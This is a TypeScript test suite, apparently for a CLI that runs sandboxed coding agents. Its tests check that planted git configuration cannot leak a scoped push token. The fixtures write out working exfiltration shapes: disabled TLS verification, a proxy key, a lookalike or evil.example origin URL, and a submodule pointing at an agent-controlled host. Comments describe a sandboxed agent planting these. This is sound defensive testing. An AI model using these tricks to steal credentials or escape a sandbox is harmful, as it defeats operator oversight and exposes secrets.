		writeFileSync(includeFile, `[http "${remote.scope}"]\n\tsslVerify = false\n`);
		const scoped = `http.${remote.scope}.sslverify`;
		// Each shape is one DeepSeek reproduction: a key the CLI's own config file does not hold, in a
		// file git reads for the push because the location names the work tree and the extension is on.
		const shapes: readonly (readonly [string, string, string])[] = [
			["URL-scoped false", `[http "${remote.scope}"]\n\tsslVerify = false\n`, scoped],
			["URL-scoped empty", `[http "${remote.scope}"]\n\tsslVerify =\n`, scoped],
			["URL-scoped sslCAInfo", `[http "${remote.scope}"]\n\tsslCAInfo = ${remote.cert}\n`, `http.${remote.scope}.sslcainfo`],
			["include.path", `[include]\n\tpath = ${includeFile}\n`, "include.path"],
			["plain false", "[http]\n\tsslVerify = false\n", "http.sslverify"],
		];
		for (const [name, plant, key] of shapes) {
			// The state git directory is CLI-owned, so the extension itself is config the CLI did not
			// write: it refuses even before a key in the file it enables is judged.
			writeFileSync(join(state, "config"), pristine);
			rmSync(join(state, "config.worktree"), { force: true });
			assert.equal(git(["--git-dir", state, "config", "--local", "extensions.worktreeConfig", "true"]).status, 0, name);
			writeFileSync(join(state, "config.worktree"), plant);
			const mark = remote.requests().length;
			assert.throws(() => pushWork(git, checkout, remote.url, commit!, pushEnv),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key), `${name}: pushWork`);
			assert.throws(() => pushHead(checkout.workTree, remote.url, commit!, pushEnv, { gitDir: state, askpass: askpass.env }),
				(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes(key), `${name}: pushHead`);
			assert.equal(remote.requests().length, mark, `${name}: a request left the CLI`);
		}
		// The harness itself: a push that really dials the self-signed server sends the canary, so a
		// "no request" above is the refusal and not a server nothing can reach.
		writeFileSync(join(state, "config"), pristine);
		rmSync(join(state, "config.worktree"), { force: true });
		const mark = remote.requests().length;
		spawnSync("git", ["--git-dir", state, "--work-tree", checkout.workTree, ...gitGuardArgs(env), "push", "--quiet",
			remote.url, `${commit}:refs/heads/control`], { encoding: "utf8", env: { ...pushEnv, GIT_SSL_NO_VERIFY: "true" }, timeout: 30_000 });
		assert.equal(carriedCanary(remote.requests().slice(mark), canary), true, "the self-signed server never saw the canary");
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("a rerun fetch refuses the planted worktree config before the scoped token reaches the server", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-rerun-fetch-"));
	const remote = await selfSignedRemote(root);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		const canary = "ghs_CANARY_RERUN_FETCH";
		const askpass = writeAskpass(secret.path, canary);
		// The DeepSeek shape: the extension on, and a worktree config that rewrites origin to the
		// self-signed server with verification git reads as false. A rerun's fetch reads that file.
		assert.equal(git(["--git-dir", state, "config", "--local", "extensions.worktreeConfig", "true"]).status, 0);
		writeFileSync(join(state, "config.worktree"),
			`[url "${remote.url}"]\n\tinsteadOf = ${bare}\n[http "${remote.scope}"]\n\tsslVerify = false\n`);
		// Control: the raw guarded fetch a rerun made before the scan, askpass in its env and no scan
		// ahead of it. The canary arrives, so "no request" below is the refusal and not a dead server.
		const mark = remote.requests().length;
		spawnSync("git", ["--git-dir", state, "--work-tree", checkout.workTree, ...gitGuardArgs(env), "fetch", "--quiet", "--no-tags", "origin"],
			{ encoding: "utf8", env: { ...env, ...askpass.env }, timeout: 30_000 });
		assert.equal(carriedCanary(remote.requests().slice(mark), canary), true, "the self-signed server never saw the canary");
		// The rerun fetch carries the scoped token, so it scans the same location first and refuses
		// the plant before any request can leave.
		const refused = remote.requests().length;
		assert.throws(() => prepareWorkRepo(git, checkout, bare, frozen, env, askpass.env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("extensions.worktreeconfig"));
		assert.equal(remote.requests().length, refused);
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("the rerun fetch never recurses into a work-tree submodule, so the scoped token stays with the work repo", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-submodule-"));
	const remote = await recordingHttpRemote(root);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const canary = "ghs_CANARY_SUBMODULE";
		const askpass = writeAskpass(secret.path, canary);
		// Each arm gets its own bare work repo with one submission ref, which is the r14 shape: git's
		// on-demand recursion is not uniform across several new submission refs, so a shared remote
		// would weaken every arm below.
		const bareFor = (name: string): string => {
			mkdirSync(join(root, name), { recursive: true });
			const copy = join(root, name, "invoice-app-7Q2K.git");
			assert.equal(spawnSync("git", ["clone", "--quiet", "--bare", bare, copy]).status, 0);
			return copy;
		};
		// What the sandboxed agent writes into its work tree during run 1: a nested repo whose origin
		// is a host the agent controls, plus the .gitmodules that makes git treat it as a submodule.
		// The nested HEAD names a commit it does not hold, so an on-demand fetch must ask that origin.
		const plantRun1 = (jobId: string, armBare: string, gitmodulesExtra = ""): JobCheckout => {
			const checkout = { gitDir: stateGitDir(jobId, env), workTree: join(root, `work-${jobId}`) };
			prepareWorkRepo(git, checkout, armBare, frozen, env);
			const sub = join(checkout.workTree, "sub");
			mkdirSync(sub);
			assert.equal(git(["-C", sub, "init", "--quiet", "-b", "main"], env).status, 0);
			writeFileSync(join(sub, "x"), "x\n");
			assert.equal(git(["-C", sub, "add", "-A"], env).status, 0);
			assert.equal(git(["-C", sub, "-c", "user.name=agent", "-c", "user.email=agent@example.invalid", "commit", "--quiet", "-m", "sub"], env).status, 0);
			assert.equal(git(["-C", sub, "remote", "add", "origin", remote.agentUrl], env).status, 0);
			writeFileSync(join(sub, ".git", "refs", "heads", "main"), `${"1".repeat(40)}\n`);
			writeFileSync(join(checkout.workTree, ".gitmodules"), `[submodule "sub"]\n\tpath = sub\n\turl = ./sub\n${gitmodulesExtra}`);
			const commit = submissionCommit(git, checkout, frozen, "run 1", env);
			assert.notEqual(commit, null);
			pushWork(git, checkout, armBare, commit!, env, askpass.env);
			return checkout;
		};
		// The fixed arm: the rerun fetch names the work-repo URL and never recurses, so the planted
		// host is never dialed and the canary never leaves the CLI.
		const fixBare = bareFor("fix");
		const fixed = plantRun1("job_FIX", fixBare);
		const mark = remote.requests().length;
		prepareWorkRepo(git, fixed, fixBare, frozen, env, askpass.env);
		assert.equal(remote.requests().length, mark, "the rerun fetch dialed the planted host");
		// The work-tree .gitmodules can turn recursion back on for a fetch that does not name the
		// flag; the guard config and the flag both outrank it, so this arm stays at zero too.
		const modulesBare = bareFor("fix-modules");
		const fixedModules = plantRun1("job_FIXMOD", modulesBare, "\tfetchRecurseSubmodules = true\n");
		const modulesMark = remote.requests().length;
		prepareWorkRepo(git, fixedModules, modulesBare, frozen, env, askpass.env);
		assert.equal(remote.requests().length, modulesMark, "a planted .gitmodules re-enabled recursion");
		// Control: the old fetch shape (a remote name git resolves from config, no flag) dials the
		// planted host and sends the canary, so the zero-hit arms prove the fix and not a dead server.
		const controlBare = bareFor("control");
		const control = plantRun1("job_CTRL", controlBare);
		const controlMark = remote.requests().length;
		const oldShape = spawnSync("git", ["--git-dir", control.gitDir, "--work-tree", control.workTree, "fetch", "--quiet", "--no-tags", "origin"],
			{ encoding: "utf8", env: { ...env, ...askpass.env }, timeout: 60_000 });
		const fresh = remote.requests().slice(controlMark);
		assert.ok(fresh.length > 0, `the old fetch shape never dialed the planted host: ${oldShape.stderr}`);
		assert.equal(carriedCanary(fresh, canary), true, "the old fetch shape never sent the canary");
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("a lookalike origin first and the real URL last refuses, and no request reaches the lookalike host", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-origin-lookalike-"));
	const remote = await recordingHttpRemote(root);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		writeFileSync(join(checkout.workTree, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		const canary = "ghs_CANARY_ORIGIN_LOOKALIKE";
		const askpass = writeAskpass(secret.path, canary);
		const setOrigin = (...values: readonly string[]): void => {
			assert.equal(git(["--git-dir", state, "config", "--local", "--unset-all", "remote.origin.url"]).status, 0);
			for (const value of values) assert.equal(git(["--git-dir", state, "config", "--local", "--add", "remote.origin.url", value]).status, 0, value);
		};
		// WHATWG's URL parser reads this value's host as github.com; git and curl read 127.0.0.1.
		const lookalike = `http://github.com\\@127.0.0.1:${remote.port}/o/w.git`;
		// A single lookalike value refuses the scan, the scoped push, and the rerun's own origin check.
		setOrigin(lookalike);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		assert.throws(() => assertSafeScopedConfig(git, checkout, env, "state", bare),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("remote.origin.url"));
		assert.throws(() => pushWork(git, checkout, bare, commit!, env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("remote.origin.url"));
		assert.throws(() => prepareWorkRepo(git, checkout, bare, frozen, env, askpass.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO");
		assert.equal(remote.requests().length, 0, "a request reached the lookalike host");
		// The lookalike first and the real URL last: `config --get` used to read the last value while
		// the fetch used the first, so the scan passed and the token went to the lookalike's host.
		setOrigin(lookalike, bare);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		assert.throws(() => pushWork(git, checkout, bare, commit!, env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("remote.origin.url"));
		assert.throws(() => prepareWorkRepo(git, checkout, bare, frozen, env, askpass.env),
			(error: CliError) => error.code === "DIR_NOT_WORK_REPO");
		assert.equal(remote.requests().length, 0, "a request reached the lookalike host");
		// Control: the old shape (the fetch resolves `origin` from config and takes its first value)
		// dials the lookalike and sends the canary, so the zero-request arms are the refusal.
		const mark = remote.requests().length;
		const oldShape = spawnSync("git", ["--git-dir", state, "--work-tree", checkout.workTree, "fetch", "--quiet", "--no-tags", "origin"],
			{ encoding: "utf8", env: { ...env, ...askpass.env }, timeout: 60_000 });
		const fresh = remote.requests().slice(mark);
		assert.ok(fresh.length > 0, `the old shape never dialed the lookalike: ${oldShape.stderr}`);
		assert.equal(carriedCanary(fresh, canary), true, "the old shape never sent the canary");
		// A plain off-github value refuses, the real URL first with the lookalike last still refuses,
		// and two values are two values even when both are the real URL: the clone writes exactly one.
		setOrigin("https://evil.example/invoice-app-7q2k.git");
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		setOrigin(bare, lookalike);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		setOrigin(bare, bare);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), ["remote.origin.url"]);
		// The one URL the CLI cloned passes.
		setOrigin(bare);
		assert.deepEqual(unsafeGitConfigKeys(git, checkout, env, "state", bare), []);
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

/**
 * An HTTP proxy in its own process that records every CONNECT it is asked for and answers 407, so the
 * git child that dials it asks its credential source. A fetch is synchronous, so an in-process proxy
 * could never answer it. The record is what proves a planted proxy key is live: a request that
 * reaches this proxy carries what git would have sent to the host the job's work repo lives on.
 */
async function recordingProxy(root: string): Promise<{ readonly url: string;
	readonly connects: () => readonly { readonly host: string; readonly proxyAuthorization: string }[]; readonly stop: () => void }> {
	const log = join(root, "proxy.log");
	writeFileSync(log, "");
	const child = spawn(process.execPath, ["--input-type=module", "-e",
		"import { appendFileSync } from 'node:fs';\n"
		+ "import { createServer } from 'node:http';\n"
		+ "const server = createServer();\n"
		+ "server.on('connect', (request, socket) => {\n"
		+ `	appendFileSync(${JSON.stringify(log)}, JSON.stringify({ host: request.url ?? "", proxyAuthorization: request.headers['proxy-authorization'] ?? "" }) + "\\n");\n`
		+ "	socket.write('HTTP/1.1 407 Proxy Authentication Required\\r\\nProxy-Authenticate: Basic realm=\"acquit-test\"\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n');\n"
		+ "	socket.end();\n"
		+ "});\n"
		+ "server.listen(0, '127.0.0.1', () => console.log(server.address().port));\n"],
		{ stdio: ["ignore", "pipe", "pipe"] });
	const port = await printedPort(child);
	return {
		url: `http://127.0.0.1:${port}`,
		connects: () => readFileSync(log, "utf8").split("\n").filter(line => line !== "")
			.map(line => JSON.parse(line) as { readonly host: string; readonly proxyAuthorization: string }),
		stop: () => child.kill("SIGKILL"),
	};
}

test("a planted remote.origin.proxy refuses the rerun fetch, and the scoped token never reaches the proxy", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-remote-proxy-"));
	const proxy = await recordingProxy(root);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		const canary = "ghs_CANARY_REMOTE_PROXY";
		const askpass = writeAskpass(secret.path, canary);
		// The URL a rerun fetches is the job's work repo on github.com, and a proxy key in the state
		// config redirects that dial to a host the CLI never chose. Git answers the proxy's 407 with
		// its credential source, so the scoped token goes to the proxy, not to the work repo. The
		// proxy URL names a user, which is the shape the audit used and the one git fills a password
		// for: without it the 407 is never retried and no credential is offered.
		const workRepoUrl = "https://github.com/acquit-forks/invoice-app-7q2k.git";
		const proxyWithUser = proxy.url.replace("http://", "http://proxy-user@");
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.origin.url", workRepoUrl]).status, 0);
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.origin.proxy", proxyWithUser]).status, 0);
		// Control: the same fetch argv and env a rerun makes, with the scan left out. The proxy sees
		// the CONNECT and the canary, so "no request" below is the refusal and not a dead proxy.
		const withoutScan = git(checkoutGitArgs(checkout, env, ["fetch", "--quiet", "--no-tags", "origin"]), { ...env, ...askpass.env });
		assert.notEqual(withoutScan.status, 0, "the planted proxy let the fetch through");
		const connects = proxy.connects();
		assert.ok(connects.length > 0, "the planted proxy was never dialed");
		assert.deepEqual([...new Set(connects.map(connect => connect.host))], ["github.com:443"]);
		assert.equal(carriedCanary(connects.map(connect => ({ authorization: connect.proxyAuthorization })), canary), true,
			`the control arm never sent the canary, so the no-request arm would prove nothing: ${JSON.stringify(connects)}`);
		// The rerun fetch carries the scoped token, so it scans the same location first: the proxy key
		// refuses by name and the fetch never runs.
		const refused = proxy.connects().length;
		assert.throws(() => prepareWorkRepo(git, checkout, workRepoUrl, frozen, env, askpass.env),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("remote.origin.proxy"));
		assert.equal(proxy.connects().length, refused);
	} finally {
		proxy.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("a linked worktree's own config refuses a scoped push on the operator's checkout", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-linked-config-"));
	const remote = await selfSignedRemote(root);
	const secret = makeSecretDir();
	try {
		const { bare, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const main = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, main], { encoding: "utf8" }).status, 0);
		const linked = join(root, "linked");
		assert.equal(git(["-C", main, "worktree", "add", "--quiet", linked, "-b", "linked-worktree"]).status, 0);
		// The extension is the operator's own on their checkout: a linked worktree's config.worktree is
		// legitimate config the scan must read, never refuse by name.
		assert.equal(git(["-C", main, "config", "extensions.worktreeConfig", "true"]).status, 0);
		writeFileSync(join(linked, "money.ts"), "const DECIMALS = 3;\n");
		assert.equal(git(["-C", linked, "add", "-A"]).status, 0);
		assert.equal(git(["-C", linked, "-c", "user.name=operator", "-c", "user.email=operator@example.invalid", "commit", "--quiet", "-m", "fix"]).status, 0);
		const commit = git(["-C", linked, "rev-parse", "HEAD"]).stdout.trim() as CommitSha;
		const canary = "ghs_CANARY_LINKED_CONFIG";
		const askpass = writeAskpass(secret.path, canary);
		const pushEnv = { ...env, ...askpass.env };
		const scoped = { gitDir: null, askpass: askpass.env };
		// A verification-on key in that file is allowed: the push then dials the self-signed server and
		// fails TLS, which is the guard doing its job rather than the scan refusing the file.
		assert.equal(git(["-C", linked, "config", "--worktree", "http.sslVerify", "true"]).status, 0);
		assert.throws(() => pushHead(linked, remote.url, commit, pushEnv, scoped),
			(error: CliError) => error.code === "PUSH_REFUSED");
		// The same key as git-false refuses, and no request leaves: the worktree config the push reads
		// is the one the scan reads.
		assert.equal(git(["-C", linked, "config", "--worktree", "http.sslVerify", "false"]).status, 0);
		const mark = remote.requests().length;
		assert.throws(() => pushHead(linked, remote.url, commit, pushEnv, scoped),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("http.sslverify"));
		assert.equal(remote.requests().length, mark);
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("a scan that reads a system or global config refuses, because the CLI hides both", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-scope-"));
	try {
		const { bare, git } = workRepoFixture(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		const home = join(root, "home");
		mkdirSync(home);
		writeFileSync(join(home, ".gitconfig"), "[user]\n\tname = scope-net\n");
		// The CLI hands every scan an env whose GIT_CONFIG_GLOBAL is its own empty file. An env that
		// leaves the operator's home config visible is not the env the push uses, and git naming that
		// scope is the only sign, so the scan refuses instead of judging a file the push never reads.
		assert.throws(() => assertSafeScopedConfig(git, { gitDir: join(own, ".git"), workTree: own },
			{ HOME: home, GIT_CONFIG_NOSYSTEM: "1" }, "own", bare),
			(error: CliError) => error.code === "GIT_CONFIG_UNSAFE" && error.message.includes("global") && error.message.includes("user.name"));
	} finally { rmSync(root, { recursive: true, force: true }); }
});

/**
 * A remote in its own process that answers every request 401. pushHead is synchronous, so an
 * in-process server could never answer the git child it blocks on; this one names a host git dials
 * and never lets a push through, which is what makes git ask the configured credential source.
 */
async function rejectingRemote(): Promise<{ readonly url: string; readonly stop: () => void }> {
	const child = spawn(process.execPath, ["--input-type=module", "-e",
		"import { createServer } from 'node:http';\n"
		+ "const server = createServer((request, response) => { response.writeHead(401, { 'WWW-Authenticate': 'Basic realm=\"acquit-test\"' }); response.end(); });\n"
		+ "server.listen(0, '127.0.0.1', () => console.log(server.address().port));"],
		{ stdio: ["ignore", "pipe", "pipe"] });
	const port = await printedPort(child);
	return { url: `http://127.0.0.1:${port}/invoice-app-7q2k.git`, stop: () => child.kill("SIGKILL") };
}

/**
 * A remote in its own process that holds every request open for `delayMs` before answering 401, so a
 * push whose bound is shorter than one answer is killed mid-call. pushWork and pushHead are
 * synchronous, so an in-process server could never answer the git child they block on.
 */
async function slowRemote(delayMs: number): Promise<{ readonly url: string; readonly stop: () => void }> {
	const child = spawn(process.execPath, ["--input-type=module", "-e",
		"import { createServer } from 'node:http';\n"
		+ `const delay = ${delayMs};\n`
		+ "const server = createServer((request, response) => {\n"
		+ "	request.resume();\n"
		+ "	setTimeout(() => { response.writeHead(401, { 'WWW-Authenticate': 'Basic realm=\"acquit-test\"' }); response.end(); }, delay);\n"
		+ "});\n"
		+ "server.listen(0, '127.0.0.1', () => console.log(server.address().port));\n"],
		{ stdio: ["ignore", "pipe", "pipe"] });
	const port = await printedPort(child);
	return { url: `http://127.0.0.1:${port}/invoice-app-7q2k.git`, stop: () => child.kill("SIGKILL") };
}

test("the scoped submit push outlives the scan's own bound when a remote answers slowly", async () => {
	// Git asks twice: once without a credential, then again with the one the askpass answers, and it
	// fails only after the second answer. Two answers of nine seconds put a push bound of fifteen
	// seconds (the scan's, which r13 handed the push) one answer in, so the delay has to sit above
	// half the old bound or the arms cannot be told apart.
	const delayMs = 9_000;
	const root = mkdtempSync(join(tmpdir(), "acquit-run-push-slow-"));
	const remote = await slowRemote(delayMs);
	const secret = makeSecretDir();
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const env = hardenedEnv(root);
		const state = stateGitDir("job_7Q2K", env);
		const checkout = { gitDir: state, workTree: join(root, "work") };
		prepareWorkRepo(git, checkout, bare, frozen, env);
		// The scoped push names the slow remote, so the checkout's origin is that URL: the state scan
		// judges the origin against the exact URL the token call names before the push runs.
		assert.equal(git(["--git-dir", state, "config", "--local", "remote.origin.url", remote.url]).status, 0);
		writeFileSync(join(checkout.workTree, "money.ts"), "const DECIMALS = 3;\n");
		const commit = submissionCommit(git, checkout, frozen, "fix", env);
		assert.notEqual(commit, null);
		const askpass = writeAskpass(secret.path, "ghs_CANARY_SLOW_PUSH");
		const started = Date.now();
		let error: CliError | null = null;
		// The submit path: pushHead builds its own git port for the scan, and the push runs on that
		// port. It is the call the audit measured, and the one whose bound r13 shortened.
		try { pushHead(checkout.workTree, remote.url, commit!, env, { gitDir: state, askpass: askpass.env }); }
		catch (thrown) { error = thrown as CliError; }
		const elapsedMs = Date.now() - started;
		assert.notEqual(error, null, "the slow remote let the push through");
		assert.equal(error!.code, "PUSH_REFUSED");
		// The push took both answers, so its bound is longer than the scan's fifteen seconds, and the
		// refusal carries git's own last line rather than the empty stderr of a child killed mid-call.
		assert.ok(elapsedMs >= 2 * delayMs - 500, `the push was cut off after ${elapsedMs}ms, short of the scan's 15s bound`);
		assert.match(error!.message, /Authentication failed/, error!.message);
	} finally {
		remote.stop();
		secret.remove();
		rmSync(root, { recursive: true, force: true });
	}
});

test("an own-checkout push keeps the operator's credential helper; a scoped push never consults it", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-push-cred-"));
	const remote = await rejectingRemote();
	try {
		const { bare, git } = workRepoFixture(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		writeFileSync(join(own, "money.ts"), "const DECIMALS = 3;\n");
		assert.equal(git(["-C", own, "add", "-A"]).status, 0);
		assert.equal(git(["-C", own, "-c", "user.name=operator", "-c", "user.email=operator@example.invalid", "commit", "--quiet", "-m", "fix"]).status, 0);
		const commit = git(["-C", own, "rev-parse", "HEAD"]).stdout.trim() as CommitSha;
		// A global credential helper the operator owns: it records that git asked it, then answers.
		const helper = join(root, "helper.sh");
		const canary = join(root, "helper-called");
		writeFileSync(helper, `#!/bin/sh\nprintf '%s\\n' "$1" >> "${canary}"\ncat >/dev/null\nprintf 'username=operator\\npassword=secret\\n'\n`, { mode: 0o755 });
		const home = join(root, "home");
		mkdirSync(home);
		writeFileSync(join(home, ".gitconfig"), `[credential]\n\thelper = ${helper}\n`);
		const operatorEnv = { HOME: home };
		// The operator's own checkout and the operator's own remote: the operator's git env, so the
		// helper is asked. The push still fails, because the remote refuses every credential.
		assert.throws(() => pushHead(own, remote.url, commit, operatorEnv),
			(error: CliError) => error.code === "PUSH_REFUSED");
		const asked = readFileSync(canary, "utf8");
		assert.match(asked, /^get$/m);
		// A push the CLI's own token drives hardens the env and clears the helper: the same remote and
		// the same checkout, but the operator's helper is never asked again.
		const secret = makeSecretDir();
		try {
			const askpass = writeAskpass(secret.path, tokenCanary);
			assert.throws(() => pushHead(own, remote.url, commit, operatorEnv, { gitDir: null, askpass: askpass.env }),
				(error: CliError) => error.code === "PUSH_REFUSED");
		} finally { secret.remove(); }
		assert.equal(readFileSync(canary, "utf8"), asked);
	} finally {
		remote.stop();
		rmSync(root, { recursive: true, force: true });
	}
});

test("pushHead strips the CLI's own variables from every git child, the own push and the scoped push alike", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-push-env-"));
	const remote = await rejectingRemote();
	try {
		const { bare, git } = workRepoFixture(root);
		const own = join(root, "own");
		assert.equal(spawnSync("git", ["clone", "--quiet", bare, own], { encoding: "utf8" }).status, 0);
		writeFileSync(join(own, "money.ts"), "const DECIMALS = 3;\n");
		assert.equal(git(["-C", own, "add", "-A"]).status, 0);
		assert.equal(git(["-C", own, "-c", "user.name=operator", "-c", "user.email=operator@example.invalid", "commit", "--quiet", "-m", "fix"]).status, 0);
		const commit = git(["-C", own, "rev-parse", "HEAD"]).stdout.trim() as CommitSha;
		// Real children the operator's own push starts: a pre-push hook in the checkout, and the
		// credential helper the operator configured globally. Each writes down only the three
		// variables under test, so no other environment value ever lands on disk.
		const probe = (dump: string): string => `#!/bin/sh\nprintf 'TOKEN=%s\\nPROVIDER_KEY=%s\\nTOKEN_FILE=%s\\n' "\${ACQUIT_TOKEN-}" "\${ACQUIT_PROVIDER_KEY-}" "\${ACQUIT_RUN_TOKEN_FILE-}" > ${dump}\n`;
		const cleared = "TOKEN=\nPROVIDER_KEY=\nTOKEN_FILE=\n";
		const hookEnv = join(root, "hook-env");
		mkdirSync(join(own, ".git", "hooks"), { recursive: true });
		writeFileSync(join(own, ".git", "hooks", "pre-push"), `${probe(hookEnv)}exit 0\n`, { mode: 0o755 });
		const helperEnv = join(root, "helper-env");
		const helper = join(root, "helper.sh");
		writeFileSync(helper, `${probe(helperEnv)}cat >/dev/null\nprintf 'username=operator\\npassword=secret\\n'\n`, { mode: 0o755 });
		const home = join(root, "home");
		mkdirSync(home);
		writeFileSync(join(home, ".gitconfig"), `[credential]\n\thelper = ${helper}\n`);
		const canaries = { ACQUIT_TOKEN: "session-canary", ACQUIT_PROVIDER_KEY: keyCanary, ACQUIT_RUN_TOKEN_FILE: "/tmp/canary-token-file" };
		const env = { HOME: home, PATH: process.env.PATH, ...canaries };
		// The operator's own credential: the hook runs on the local push, the helper on the rejecting
		// remote. The push itself is not the subject here.
		pushHead(own, bare, commit, env);
		assert.throws(() => pushHead(own, remote.url, commit, env), (error: CliError) => error.code === "PUSH_REFUSED");
		assert.equal(readFileSync(hookEnv, "utf8"), cleared, "the pre-push hook saw one of the CLI's variables");
		assert.equal(readFileSync(helperEnv, "utf8"), cleared, "the credential helper saw one of the CLI's variables");
		// The scoped push's askpass child is another git child. The CLI's own script only reads its
		// token file, so the test plays the child by replacing the script; the token value still comes
		// from the file the CLI wrote.
		const secret = makeSecretDir();
		try {
			const askpass = writeAskpass(secret.path, tokenCanary);
			const askpassEnv = join(root, "askpass-env");
			writeFileSync(askpass.script, `${probe(askpassEnv)}printf 'x-access-token\\n'\n`, { mode: 0o700 });
			assert.throws(() => pushHead(own, remote.url, commit, env, { gitDir: null, askpass: askpass.env }),
				(error: CliError) => error.code === "PUSH_REFUSED");
			assert.equal(readFileSync(askpassEnv, "utf8"), cleared, "the askpass child saw one of the CLI's variables");
		} finally { secret.remove(); }
	} finally {
		remote.stop();
		rmSync(root, { recursive: true, force: true });
	}
});

test("diff reads a run checkout through the state git directory, never discovery", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-diff-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const stateHome = join(root, "state-home");
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: stateHome });
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, process.env);
		writeFileSync(join(work, "money.ts"), "const DECIMALS = 3;\n");
		const judged = submissionCommit(git, checkout, frozen, "Run job_7Q2K with ts-bugfixer", process.env);
		assert.notEqual(judged, null);
		// The work tree has no git metadata: only the state git directory can answer for this checkout.
		assert.equal(spawnSync("git", ["-C", work, "rev-parse", "HEAD"]).status !== 0, true);
		const job = jobView({ contract: { repository: "maya-client/invoice-app", frozenAt: frozen, frozenTests: 48, hiddenTests: 6, protectedPaths: [] },
			attempts: { used: 1, left: 2, last: "REJECTED", reasons: [], history: [{ ordinal: 1, result: "REJECTED", reasons: [], reasonsTruncated: 0,
				sourceCommit: judged as CommitSha, at: "2026-11-08T09:12:00.000Z", frozen: null, hidden: null, pullRequest: null }],
				pending: null, failure: null } });
		const client = { baseUrl: "http://api.test", async get() { return { job }; },
			async post() { return { status: 200, body: {} }; } } as unknown as ApiClient;
		const patch = await runDiff({ apiUrl: "http://api.test", token: "t", jobId: "job_7Q2K", dir: work },
			{ client, env: { XDG_STATE_HOME: stateHome } });
		assert.match(patch, /\+const DECIMALS = 3;/);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

// ---- docker command assembly ------------------------------------------------------------------

test("sandbox names are prefixed with acquit-runner-<job> and every network is per run", () => {
	const names = sandboxNames("job_7Q2K");
	assert.deepEqual(names, { runner: "acquit-runner-job_7Q2K", proxy: "acquit-runner-job_7Q2K-proxy",
		network: "acquit-runner-job_7Q2K-net", egress: "acquit-runner-job_7Q2K-egress" });
	assert.deepEqual(networkCreateArgs(names.network), ["network", "create", "--internal", names.network]);
	assert.deepEqual(egressNetworkCreateArgs(names.egress),
		["network", "create", "-o", "com.docker.network.bridge.enable_icc=false", names.egress]);
	assert.deepEqual(networkConnectArgs(names.network, names.proxy), ["network", "connect", names.network, names.proxy]);
	const proxy = proxyRunArgs(names.proxy, names.egress, "acquit/runner-node20", "api.anthropic.com");
	assert.deepEqual(proxy, ["run", "--detach", "--rm", "--name", names.proxy, "--network", names.egress, "--pull=never",
		"-e", "ACQUIT_PROVIDER_HOST=api.anthropic.com", "acquit/runner-node20", "node", "/runner/proxy.mjs"]);
